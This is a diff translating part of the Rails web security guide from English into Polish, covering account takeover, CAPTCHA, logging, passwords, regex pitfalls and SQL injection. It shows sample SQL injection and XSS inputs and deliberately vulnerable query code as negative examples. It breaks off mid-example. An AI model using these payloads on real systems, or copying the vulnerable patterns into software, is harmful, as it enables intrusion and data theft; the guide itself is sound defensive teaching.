+<div class="paragraph"><p>Jednak tym, co najczęściej zaniedbują projektanci aplikacji internetowych, są strony z zapomnianymi hasłami . Strony te często przyznają, że wpisana nazwa użytkownika lub adres e-mail (nie) została znaleziona. To pozwala atakującemu na skompilowanie listy nazw użytkowników i atak typu brute-force na ich konta.</p></div>
+<div class="paragraph"><p>W celu złagodzenia takich ataków, <span style="color: #;background-color: fffcdb;">wyświetlaj ogólne komunikat o błędzie, również na stronach z zapomnianymi hasłami</span>. Ponadto, możesz <span style="color: #;background-color: fffcdb;">wymagać, aby wprowadzić CAPTCHA po kilku błędów logowania z pewnego adresu IP</span>. Należy jednak pamiętać, że nie jest to stu procentowa ochrona przed automatycznymi programami, ponieważ te programy mogą bardzo często zmieniać adres IP. Jednakże zwiększa do poziom ochrony przed atakiem.</p></div>
+<h3 id="_przej_cie_konta_u_ytkownika">6.2. Przejęcie konta użytkownika</h3>
+<div class="paragraph"><p>-- <em>Wiele aplikacji internetowych ułatwiają przejęcie kont użytkowników. Dlaczego by nie zrobić na odwrót i tego nie utrudnić?</em></p></div>
+<h4 id="_has_a">6.2.1. Hasła</h4>
+<div class="paragraph"><p>Pomyśl o sytuacji, gdy atakujący posiada skradzione cookie sesji użytkownika, a zatem może wspólnie z użytkownikiem używać aplikacji. Jeżeli zmiana hasła jest łatwa, atakujący będzie mógł przejąć konto w kilku kliknięciach. Lub jeżeli formularz zmiany hasła jest podatny na atak CSRF, atakujący będzie mógł zmienić hasło ofiary wabiąc ją do strony internetowej, gdzie jest spreparowany IMG-tag, który odpala CSRF. Można temu zaradzić i <span style="color: #;background-color: fffcdb;">stworzyć formularz zmiany hasła odporny na CSRF</span>. I <span style="color: #;background-color: fffcdb;">wymagać od użytkownika, aby wprowadzał stare hasło przy jego zmianie</span>.</p></div>
+<h4 id="_maile">6.2.2. Maile</h4>
+<div class="paragraph"><p>Jednakże, atakujący może również przejąć konto zmieniając adres e-mail. Po jego zmianie, przejdzie na stronę z zapomnianym hasłem i (prawdopodobnie nowy) hasło zostanie wysłane na adres e-mail atakującej osoby. Żeby temu zaradzić, można[,fffcdb]#wymagać od użytkownika, aby wprowadził hasło przy zmianie adresu e-mail.</p></div>
+<h4 id="_inne">6.2.3. Inne</h4>
+<div class="paragraph"><p>W zależności od Twojej aplikacji internetowej, może być więcej sposobów na przejęcie konta użytkownika. W wielu przypadkach można to zrobić za pomocą XSS i CSRF. Na przykład, podatność na CSRF w <a href="http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/</a> [Google Mail]. W dowodzie koncepcji (proof-of-concept) tego ataku, ofiara miała być zwabiona do witryny internetowej kontrolowanej przez atakującego. Na tej stronie jest spreparowany IMG-tag, którego skutkiem jest żądanie HTTP GET,  zmieniające ustawienia filtru w Google Mail. Jeżeli ofiara byłaby zalogowana na Google Mail, atakujący zmieniłby filtry i ustawił przekazywanie wszystkich wiadomości e-mail na jego adres e-mail. Jest to prawie tak szkodliwe, jak przejęcie całego konta. Można temu zaradzić <span style="color: #;background-color: fffcdb;">przeglądając logikę aplikacji i eliminując wszystkie luki wrażliwe na XSS i CSRF</span>.</p></div>
+<h3 id="_captcha">6.3. CAPTCHA</h3>
+<div class="paragraph"><p>-- <em>CAPTCHA jest testem typu challenge-response w celu ustalenia, że odpowiedź nie jest generowana przez komputer. Jest często używany do ochrony formularzy komentarza przed automatycznymi spam-botami. CAPTCHA prosi użytkownika o wypisanie liter z zniekształconego obrazka. Pomysł negatywnego CAPTCHA nie jest po to by udowadniać, że użytkownik jest człowiekiem, lecz po to, by ujawniać, że robot jest robotem.</em></p></div>
+<div class="paragraph"><p>Ale nie tylko spam roboty (boty) są problemem. Boty automatycznie logogujące również są problematyczne. Popularnym CAPTCHA API jest <a href="http://recaptcha.net/">reCAPTCHA</a>, który wyświetla dwa zniekształcone obrazy zawierające słowa ze starych książek. reCAPTCHA dodaje również ukośne linie, zamiast zniekształcania tła i wysokiego poziomu wyginania tekstu jak to było w przypadku wcześniejszych CAPTCHA, które zostały złamane. Jako dodatek, używanie reCAPTCHA pomaga w tworzeniu cyfrowych wersji starych książek. <a href="http://ambethia.com/recaptcha/">ReCAPTCHA</a> jest także Railsową wtyczką, o takiej samej nazwie jak API.</p></div>
+<div class="paragraph"><p>Otrzymasz dwa klucze od API, publiczny i prywatny, który trzeba umieścić w swoim środowisku Railsowym. Po tym możesz użyć metody recaptcha_tags w widoku i metody verify_recaptcha w kontrolerze. Verify_recaptcha zwróci false, jeżeli walidacja zawiedzie.
+Problem z CAPTCHA jest taki, że są irytujące. Ponadto, niektórzy niedowidzący użytkownicy uznali, że niektóre rodzaje zniekształcenia CAPTCHA są trudne do odczytania. Pomysł negatywnego CAPTCHA nie jest po to by udowadniać, że użytkownik jest człowiekiem, lecz po to, by ujawniać, że robot jest robotem.</p></div>
+<div class="paragraph"><p>Większość botów jest naprawdę głupia – przeszukują sieć i umieszczają spam w każdym znalezionym polu formularza. Negatywne CAPTCHA wykorzystują to i umieszczają pole "honeypot" w formularzu, które będzie ukryte przed człowiekiem przez CSS lub JavaScript.</p></div>
+<div class="paragraph"><p>Oto kilka pomysłów, jak ukryć pola honeypot przez JavaScript i/lub CSS:</p></div>
 <div class="ulist"><ul>
 <li>
 <p>
-position the fields off of the visible area of the page
+Umieszczenie pola poza widocznym obszarem strony
 </p>
 </li>
 <li>
 <p>
-make the elements very small or colour them the same as the background of the page
+Stworzenie bardzo małych elementów lub w tym samym kolorze, co tło strony
 </p>
 </li>
 <li>
 <p>
-leave the fields displayed, but tell humans to leave them blank
+Zostaw pola widoczne, ale poinformuj ludzi, żeby pozostawić je puste
 </p>
 </li>
 </ul></div>
-<div class="paragraph"><p>The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.</p></div>
-<div class="paragraph"><p>You can find more sophisticated negative CAPTCHAs in Ned Batchelder&#8217;s <a href="http://nedbatchelder.com/text/stopbots.html">blog post</a>:</p></div>
+<div class="paragraph"><p>Najprostsze negatywne CAPTCHA to te, ukryte w polach honeypot. Po stronie serwera, sprawdzana jest wartość pola: Jeśli zawiera tekst, to musi być bot. Następnie można zignorować dodany post, lub zwrócić pozytywny wynik, ale nie zapisywać posta w bazie danych. W ten sposób bot będzie zadowolony i przejdzie dalej. Można to również zrobić z irytującymi użytkownikami.</p></div>
+<div class="paragraph"><p>Bardziej wyrafinowane negatywne CAPTCHA możesz znaleźć na <a href="http://nedbatchelder.com/text/stopbots.html">http://nedbatchelder.com/text/stopbots.html</a> [blogu Batchelder Ned’a]:</p></div>
 <div class="ulist"><ul>
 <li>
 <p>
-Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.
+Dołącz pole z aktualnym znacznikiem czasowym UTC i sprawdź go na serwerze. Jeżeli jest on zbyt daleko w przeszłości, lub w przyszłości, formularz jest nieprawidłowy.
 </p>
 </li>
 <li>
 <p>
-Randomize the field names
+Nazwy pól dobieraj losowo
 </p>
 </li>
 <li>
 <p>
-Include more than one honeypot field of all types, including submission buttons
+Umieszczaj więcej niż jedno pole honeypot we wszelkich rodzajach, również w przycisku wysyłania.
 </p>
 </li>
 </ul></div>
-<div class="paragraph"><p>Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So negative CAPTCHAs might not be good to protect login forms.</p></div>
-<h3 id="_logging">7.4. Logging</h3>
-<div class="paragraph"><p>-- <em>Tell Rails not to put passwords in the log files.</em></p></div>
-<div class="paragraph"><p>By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers etcetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can <span style="background-color: #fffcdb;">filter certain request parameters from your log files</span> by the filter_parameter_logging method in a controller. These parameters will be marked [FILTERED] in the log.</p></div>
+<div class="paragraph"><p>Zauważ, że to chroni Cię jedynie przed automatycznymi botami, specjalnie wykonane roboty nie mogą być w ten sposób zatrzymane. Więc CAPTCHA może okazać się nienajlepszym sposobem by chronić formularze logowania.</p></div>
+<h3 id="_logowanie">6.4. Logowanie</h3>
+<div class="paragraph"><p>-- <em>Postaraj się, żeby Railsy nie wpisywały haseł w rejestrze.</em></p></div>
+<div class="paragraph"><p>Domyślnie Railsy rejestrują wszystkie żądania do strony internetowej. Ale rejestry mogą stanowić ogromny problem związany z zabezpieczeniami, ponieważ mogą one zawierać dane logowania, numery kart kredytowych itp. Podczas projektowania konceptu bezpieczeństwa aplikacji internetowej, należy pomyśleć o tym, co się stanie, gdy atakujący będzie miał (pełny) dostęp do serwera WWW. Szyfrowanie klucze i hasła w bazie danych będą bezużyteczne, jeżeli rejestr wylistuje je jako zwykły tekst. Możesz <span style="color: #;background-color: fffcdb;">filtrować niektóre parametry żądań z rejestru</span> dzięki metodzie w kontrolerze filter_parameter_logging. Parametry te będą oznaczone [filtrowane] w rejestrze.</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>filter_parameter_logging <span style="color: #990000">:</span>password</tt></pre></div></div>
-<h3 id="_good_passwords">7.5. Good passwords</h3>
-<div class="paragraph"><p>-- <em>Do you find it hard to remember all your passwords? Don&#8217;t write them down, but use the initial letters of each word in an easy to remember sentence.</em></p></div>
-<div class="paragraph"><p>Bruce Schneier, a security technologist, <a href="http://www.schneier.com/blog/archives/2006/12/realworld_passw.html">has analysed</a> 34,000 real-world user names and passwords from the MySpace phishing attack mentioned earlier. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:</p></div>
+<h3 id="_dobre_has_a">6.5. Dobre hasła</h3>
+<div class="paragraph"><p>-- <em>Czy ciężko Ci zapamiętać wszystkie hasła? Nie zapisuj ich, lecz korzystaj z pierwszych liter wyrazów w łatwym do zapamiętania zdaniu.</em></p></div>
+<div class="paragraph"><p>Bruce Schneier, technolog zabezpieczeń, <a href="http://www.schneier.com/blog/archives/2006/12/realworld_passw.html">http://www.schneier.com/blog/archives/2006/12/realworld_passw.html</a> [przeanalizował] 34000 występujących w świecie rzeczywistym nazw użytkowników i haseł ze wspomnianej wcześniej próby wyłudzenia danych z MySpace. Okazuje się, że większość haseł jest dość łatwa do złamania. Oto 20 najpopularniejszych haseł:</p></div>
 <div class="paragraph"><p>password1, abc123, myspace1, password, blink182, qwerty1, <strong>*</strong>*you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1 and monkey.</p></div>
-<div class="paragraph"><p>It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. However, password cracker dictionaries contain a large number of today&#8217;s passwords, and they try out all kinds of (alphanumerical) combinations. If an attacker knows your user name and you use a weak password, your account will be easily cracked.</p></div>
-<div class="paragraph"><p>A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the <span style="background-color: #fffcdb;">first letters of a sentence that you can easily remember</span>. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.</p></div>
-<h3 id="_regular_expressions">7.6. Regular expressions</h3>
-<div class="paragraph"><p>-- <em>A common pitfall in Ruby&#8217;s regular expressions is to match the string&#8217;s beginning and end by ^ and $, instead of \A and \z.</em></p></div>
-<div class="paragraph"><p>Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books make this wrong. So how is this a security threat? Imagine you have a File model and you validate the file name by a regular expression like this:</p></div>
+<div class="paragraph"><p>Interesujący jest fakt, że tylko 4% tych haseł to słownikowe wyrazy i większość to hasła alfanumeryczne. Jednak słowniki crackerów haseł zawierają wiele dzisiejszych haseł i próbują wszystkich (alfanumerycznych) kombinacji. Jeśli atakujący zna nazwę użytkownika, który używa słabego hasła, w łatwy sposób można dokonać włamania.</p></div>
+<div class="paragraph"><p>Dobrym hasłem jest długa mieszanka alfanumerycznych kombinacji różnego rodziaju. Ponieważ jest to dość trudne do zapamiętania, jest wskazane, aby zapisać tylko <span style="color: #;background-color: fffcdb;">pierwsze litery zdania, która można łatwo zapamiętać</span>. Na przykład "Szybki brązowy lis przeskoczył nad leniwym psem" będzie "Sblpnlp". Zauważ, że jest to tylko przykład, nie należy używać znanego wyrażenia, które może pojawić się w słowniki crackera.</p></div>
+<h3 id="_wyra_enia_regularne">6.6. Wyrażenia regularne</h3>
+<div class="paragraph"><p>-- <em>Powszechną pułapką w wyrażeniach regularnych w Ruby jest dopasowanie ciągu na początku i na końcu przez ^ i $, zamiast \A i \z.</em></p></div>
+<div class="paragraph"><p>Ruby używa nieco innego podejścia niż w wielu innych językach, aby dopasować koniec i początek ciągu znaków. Dlatego nawet w książkach o Ruby i Railsach popełnia się błędy. Więc w jaki sposób może to zagrażać bezpieczeństwu? Wyobraź sobie, że masz model pliku i walidujesz nazwę pliku przez wyrażenie regularne w taki sposób:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -755,12 +747,12 @@ http://www.gnu.org/software/src-highlite -->
 <pre><tt><span style="font-weight: bold"><span style="color: #0000FF">class</span></span> File <span style="color: #990000">&lt;</span> ActiveRecord<span style="color: #990000">::</span>Base
   validates_format_of <span style="color: #990000">:</span>name<span style="color: #990000">,</span> <span style="color: #990000">:</span>with <span style="color: #990000">=&gt;</span> <span style="color: #FF6600">/^[\w\.\-\+]+$/</span>
 <span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
-<div class="paragraph"><p>This means, upon saving, the model will validate the file name to consist only of alphanumeric characters, dots, + and -. And the programmer added ^ and $ so that file name will contain these characters from the beginning to the end of the string. However, <span style="background-color: #fffcdb;">in Ruby ^ and $ matches the <strong>line</strong> beginning and line end</span>. And thus a file name like this passes the filter without problems:</p></div>
+<div class="paragraph"><p>Oznacza to, że model potwierdzi nazwę pliku składającą się tylko ze znaków alfanumerycznych, kropek, + i -. I programista dodaje ^ i $ tak, że nazwa pliku będzie zawierać te znaki od początku do końca łańcucha. Jednakże <span style="color: #;background-color: fffcdb;">w Ruby ^ i $ odpowiada <strong>line</strong> początkowi i końcu linii</span>. A więc taka nazwa pliku przechodzi przez filtr bez problemów:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>file.txt%0A&lt;script&gt;alert('hello')&lt;/script&gt;</tt></pre>
 </div></div>
-<div class="paragraph"><p>Whereas %0A is a line feed in URL encoding, so Rails automatically converts it to "file.txt\n&lt;script&gt;alert(<em>hello</em>)&lt;/script&gt;". This file name passes the filter because the regular expression matches – up to the line end, the rest does not matter. The correct expression should read:</p></div>
+<div class="paragraph"><p>Jak %0A jest feedem linii w kodowaniu URL, tak w Railsach automatycznie konwertuje je do "file.txt\n&lt;script&gt;alert(‘Hello’)&lt;/script&gt;". Ta nazwa pliku przechodzi przez filtr, gdyż wyrażenie regularne pasuje - do końca linii, reszta nie ma znaczenia. Prawidłowe wyprażenie powinno brzmieć:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -768,225 +760,237 @@ http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt><span style="color: #FF6600">/\A[\w\.\-\+]+\z/</span>
 <span style="color: #990000">[</span>source<span style="color: #990000">,</span> ruby<span style="color: #990000">]</span></tt></pre></div></div>
-<h3 id="_privilege_escalation">7.7. Privilege escalation</h3>
-<div class="paragraph"><p>-- <em>Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it.</em></p></div>
-<div class="paragraph"><p>The most common parameter that a user might tamper with, is the id parameter, as in <tt>http://www.domain.com/project/1</tt>, whereas 1 is the id. It will be available in params[:id] in the controller. There, you will most likely do something like this:</p></div>
+<h3 id="_eskalacja_przywilej_w">6.7. Eskalacja przywilejów</h3>
+<div class="paragraph"><p>-- <em>Zmiana pojedynczego parametru może dać użytkownikowi nieautoryzowany dostęp. Pamiętaj, że każdy parametr może ulec zmianie, bez względu na to jak bardzo go ukrywasz zacierasz.</em></p></div>
+<div class="paragraph"><p>Najpopularniejszym parametrem, który użytkownik może modyfikować, jest parametr id, jak w <a href="http://www.domain.com/project/1">http://www.domain.com/project/1</a>+, gdziet 1 jest identyfikatorem. Jest on dostępny w params[:id] w kontrolerze. Najprawdopodobniej będziesz mógł teraz zrobić coś takiego:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt><span style="color: #009900">@project</span> <span style="color: #990000">=</span> Project<span style="color: #990000">.</span>find<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>id<span style="color: #990000">])</span></tt></pre></div></div>
-<div class="paragraph"><p>This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, <span style="background-color: #fffcdb;">query the user&#8217;s access rights, too</span>:</p></div>
+<div class="paragraph"><p>Jest to w porządku dla niektórych aplikacji internetowych, ale z pewnością nie w przypadku, gdy użytkownik nie ma uprawnień, aby zobaczyć wszystkie projekty. Jeśli użytkownik zmienia id na 42 i nie jest uprawniony do przeglądania informacji, to i tak będzie miał do nich dostęp. Zamiast tego[,fffcdb]#pytaj również o prawa dostępu użytkownika:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt><span style="color: #009900">@project</span> <span style="color: #990000">=</span> <span style="color: #009900">@current_user</span><span style="color: #990000">.</span>projects<span style="color: #990000">.</span>find<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>id<span style="color: #990000">])</span></tt></pre></div></div>
-<div class="paragraph"><p>Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, <span style="background-color: #fffcdb;">no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated</span>.</p></div>
-<div class="paragraph"><p>Don‘t be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form&#8217;s hidden fields. <span style="background-color: #fffcdb;">JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values</span>. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.</p></div>
+<div class="paragraph"><p>W zależności od twojej aplikacji internetowej, może być o wiele więcej parametrów, które użytkownik może modyfikować. Przyjmij zasadę, że <span style="color: #;background-color: fffcdb;">żadne dane wejściowe użytkownika nie są bezpieczne, dopóki nie zostanie udowodnione, że jest inaczej. Użytkownik może manipulować każdym parametrem</span>.</p></div>
+<div class="paragraph"><p>Nie daj się nabrać na ściemnione bezpieczeństwo i bezpieczeństwo JavaScript. Toolbar progamisty dla przeglądarki Mozilla Firefox pozwala przejrzeć i zmienić każde ukryte pole formularza. <span style="color: #;background-color: fffcdb;">JavaScript może być wykorzystywany w celu weryfikacji danych użytkownika, ale z pewnością nie po to, by zapobiec wysyłaniu złośliwych żądań z nieoczekiwanymi wartościami</span>. Wtyczka Live Http Headers do przeglądarki Mozilla Firefox rejestruje każde żądanie, może go powtarzać i zmieniać. Jest to prosty sposób na ominięcie wszelkich walidacji przez JavaScript. Są też nawet proxy po stronie klienta, które pozwalają na przechwytywanie wszelkich żądań i odpowiedzi z i do Internetu.</p></div>
 </div>
-<h2 id="_injection">8. Injection</h2>
+<h2 id="_atak_typu_injection">7. Atak typu Injection</h2>
 <div class="sectionbody">
-<div class="paragraph"><p>-- <em>Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection.</em></p></div>
-<div class="paragraph"><p>Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.</p></div>
-<h3 id="_whitelists_versus_blacklists">8.1. Whitelists versus Blacklists</h3>
-<div class="paragraph"><p>-- <em>When sanitizing, protecting or verifying something, whitelists over blacklists.</em></p></div>
-<div class="paragraph"><p>A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although, sometimes it is not possible to create a whitelist (in a SPAM filter, for example), <span style="background-color: #fffcdb;">prefer to use whitelist approaches</span>:</p></div>
 <div class="ulist"><ul>
 <li>
 <p>
-Use before_filter :only =&gt; [...] instead of :except =&gt; [...]. This way you don&#8217;t forget to turn it off for newly added actions.
+<em>Klasa ataków typu ijection polega na wprowadzeniu złośliwego kodu lub parametrów do aplikacji internetowej w celu uruchomienia jej w kontekście jej bezpieczeństwa. Czołowy przykład ataku typu injection jest atak cross-site scripting (XSS) I atak typu SQL injection.</em>
+</p>
+</li>
+</ul></div>
+<div class="paragraph"><p>Atak typu injection jest bardzo podstępny, ponieważ ten sam kod lub parametr może być złośliwy w jednym kontekście, ale całkowicie nieszkodliwy w innym. Kontekstem może być kodowanie, zapytania lub język programowania, powłoka (Shell) lub metoda w Ruby/Rails. Poniższe sekcje będą obejmować wszystkie ważne konteksty gdzie mogą wystąpić ataki typu injection. Pierwsza część obejmuje architektoniczne decyzje w związku z atakiem typu injection.</p></div>
+<h3 id="_bia_e_listy_vs_czarne_listy">7.1. Białe listy vs Czarne listy</h3>
+<div class="paragraph"><p>-- <em>Przy poprawianiu, ochronie lub sprawdzeniu czegoś, białe wygrywają z czarnymi listami.</em></p></div>
+<div class="paragraph"><p>Czarna lista może być zbiorem złych adresów e-mail, niepublicznych działań lub złych tagów HTML. Jest przeciwieństwem do białej listy, która zawiera dobre adresy e-mail, publiczne działania, dobre znaczniki HTML i tak dalej. Chociaż czasami nie jest możliwe stworzenie białej (na przykład filtr antyspamowy), <span style="background-color: #fffcdb;">lepiej używać białej list</span>:</p></div>
+<div class="ulist"><ul>
+<li>
+<p>
+Korzystaj z: before_filter:only =&gt; [...] zamiast: expect =&gt; [...]. W ten sposób nie zapomnisz go wyłączyć dla świeżo dodanych akcji.
 </p>
 </li>
 <li>
 <p>
-Use attr_accessible instead of attr_protected. See the mass-assignment section for details
+Korzystaj z: attr_accessible zamiast: attr_protected. Szczegóły znajdziesz w sekcji o masowym przypisaniu.
 </p>
 </li>
 <li>
 <p>
-Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.
+Zezwól na &lt;strong&gt; zamiast usuwania &lt;script&gt; przeciwko Cross-Site Scripting (XSS). Zobacz poniżej.
 </p>
 </li>
 <li>
 <p>
-Don&#8217;t try to correct user input by blacklists:
+Nie próbuj poprawiać wejścia użytkownika przez czarne listy:
 </p>
 <div class="ulist"><ul>
 <li>
 <p>
-This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
+W ten sposób atak będzie działał tak: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
 </p>
 </li>
 <li>
 <p>
-But reject malformed input
+Ale odrzucaj nieprawidłowe wejście
 </p>
 </li>
 </ul></div>
 </li>
 </ul></div>
-<div class="paragraph"><p>Whitelists are also a good approach against the human factor of forgetting something in the blacklist.</p></div>
-<h3 id="_sql_injection">8.2. SQL Injection</h3>
-<div class="paragraph"><p>-- <em>Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem.</em></p></div>
-<h4 id="_introduction">8.2.1. Introduction</h4>
-<div class="paragraph"><p>SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:</p></div>
+<div class="paragraph"><p>Białe są również dobre w przypadku gdy ludzie zapominają pewnych rzeczy umieścić na czarnych listach.</p></div>
+<h3 id="_atak_typu_sql_injection">7.2. Atak typu SQL Injection</h3>
+<div class="paragraph"><p>-- <em>Dzięki zmyślnym metodom, ten problem zniknął już z większości aplikacji Railsowych. Jest to jednak bardzo niszczycielski i powszechny atak na aplikacje internetowe, więc ważne jest, aby zrozumieć problem.</em></p></div>
+<h4 id="_wst_p_2">7.2.1. Wstęp</h4>
+<div class="paragraph"><p>Atak typu SQL injection ma na celu wpływanie na zapytania do bazy danych poprzez manipulowanie parametrami aplikacji internetowej. Popularnym celem ataków typu SQL injection jest ominięcie autoryzacji. Kolejnym celem jest manipulacja danymi lub odczyt dowolnych danych. Oto przykład, jak nie używać danych wejściowych użytkownika w zapytaniu:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>Project<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>all<span style="color: #990000">,</span> <span style="color: #990000">:</span>conditions <span style="color: #990000">=&gt;</span> <span style="color: #FF0000">"name = '#{params[:name]}'"</span><span style="color: #990000">)</span></tt></pre></div></div>
-<div class="paragraph"><p>This could be in a search action and the user may enter a project&#8217;s name that he wants to find. If a malicious user enters <em> OR 1=1</em>, the resulting SQL query will be:</p></div>
+<div class="paragraph"><p>Może to być w akcji wyszukiwania i użytkownik może wpisać nazwę projektu, który chce znaleźć. Jeśli złośliwy użytkownik wpisze <em> OR 1=1</em>, wynikiem zapytania SQL będzie:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>SELECT * FROM projects WHERE name = '' OR 1 --'</tt></pre>
 </div></div>
-<div class="paragraph"><p>The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.</p></div>
-<h4 id="_bypassing_authorization">8.2.2. Bypassing authorization</h4>
-<div class="paragraph"><p>Usually a web application includes access control. The user enters his login credentials, the web applications tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.</p></div>
+<div class="paragraph"><p>Dwie kreski rozpoczynają komentarz ignorując wszystko po nim. Zatem zapytanie zwraca wszystkie rekordy z tabeli projekty, w tym te niewidoczne dla użytkownika. Dzieje się tak, ponieważ warunek jest prawdziwy dla wszystkich rekordów.</p></div>
+<h4 id="_pomini_cie_autoryzacji">7.2.2. Pominięcie autoryzacji</h4>
+<div class="paragraph"><p>Zwykle aplikacja internetowa zawiera kontrolę dostępu. Użytkownik wprowadza jego dane logowania, a aplikacja próbuje znaleźć pasujący rekord w tabeli użytkowników. Aplikacja zapewnia dostęp, jeżeli znajdzie rekord. Jednakże, osoba atakująca może ewentualnie pominąć ten krok poprzez atak SQL injection. Poniżej pokazane jest typowe zapytanie do bazy danych w Railsach w celu znalezienia pierwszego rekordu w tabeli użytkowników, który pasuje do parametrów logowania dostarczonych przez użytkownika.</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>User<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>first<span style="color: #990000">,</span> <span style="color: #FF0000">"login = '#{params[:name]}' AND password = '#{params[:password]}'"</span><span style="color: #990000">)</span></tt></pre></div></div>
-<div class="paragraph"><p>If an attacker enters <em> OR '1</em>=<em>1 as the name, and ' OR '2</em>&gt;'1 as the password, the resulting SQL query will be:</p></div>
+<div class="paragraph"><p>Jeżeli atakujący wprowadzi <em> OR '1</em>=<em>1 jako imię i ' OR '2</em>&gt;'1 jako hasło, rezultat zapytania SQL będzie następujący:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1</tt></pre>
 </div></div>
-<div class="paragraph"><p>This will simply find the first record in the database, and grants access to this user.</p></div>
-<h4 id="_unauthorized_reading">8.2.3. Unauthorized reading</h4>
-<div class="paragraph"><p>The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let&#8217;s take the example from above:</p></div>
+<div class="paragraph"><p>To po prostu znajdzie pierwszego użytkownika w bazie danych i zapewni mu dostęp do aplikacji.</p></div>
+<h4 id="_nieautoryzowane_czytanie">7.2.3. Nieautoryzowane czytanie</h4>
+<div class="paragraph"><p>UNIA łączy dwa zapytania SQL i zwraca dane w jednym zestawie. Atakujący może jej użyć do odczytu arbitralnych danych z bazy danych. Weźmy przykład z góry:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>Project<span style="color: #990000">.</span>find<span style="color: #990000">(:</span>all<span style="color: #990000">,</span> <span style="color: #990000">:</span>conditions <span style="color: #990000">=&gt;</span> <span style="color: #FF0000">"name = '#{params[:name]}'"</span><span style="color: #990000">)</span></tt></pre></div></div>
-<div class="paragraph"><p>And now let&#8217;s inject another query using the UNION statement:</p></div>
+<div class="paragraph"><p>A teraz wprowadźmy inne zapytanie używając UNII:</p></div>
 <div class="literalblock">
 <div class="content">
